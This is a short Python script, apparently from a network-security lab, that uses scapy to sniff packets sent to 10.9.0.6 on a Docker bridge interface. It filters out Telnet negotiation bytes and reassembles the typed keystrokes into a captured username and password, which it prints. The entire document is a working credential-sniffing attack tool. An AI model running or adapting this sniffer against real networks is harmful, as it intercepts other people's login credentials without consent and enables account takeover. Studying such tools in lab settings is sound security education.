from scapy.all import *
from scapy.layers.inet import IP

username = []
return_cnt = 0
password = []

def print_user_pass():
    u = "".join(username)
    p = "".join(password)
    print(f'Username: {u}')
    print(f'Password: {p}')

def print_pckt(pckt):
    global username, password, return_cnt
    if pckt.haslayer(Raw):
        byte_data = pckt[Raw].load
        if byte_data == b'\r\x00':
            return_cnt += 1
        elif byte_data == b'\n':
            return_cnt = 0
        elif byte_data == b'\r\n':
            return_cnt = 0
        elif byte_data == b'\b':
            pass
        elif byte_data == b'':
            pass
        elif not byte_data.startswith(b'\xff'):
            try:
                text = byte_data.decode('utf-8', errors='ignore')
                if text.strip():
                    print(text)
                    if return_cnt == 0:
                        username.append(text)
                    else:
                        password.append(text)
            except:
                print(f'Data: {byte_data}')
        if return_cnt == 2:
            print_user_pass()
        
def is_raw_frame(pckt):
    return pckt.haslayer(Raw) and pckt.haslayer(IP) and (pckt[IP].dst == '10.9.0.6')

if __name__ == "__main__":
    sniff(iface='br-3a2a978ea855', lfilter=is_raw_frame, prn=print_pckt)

    

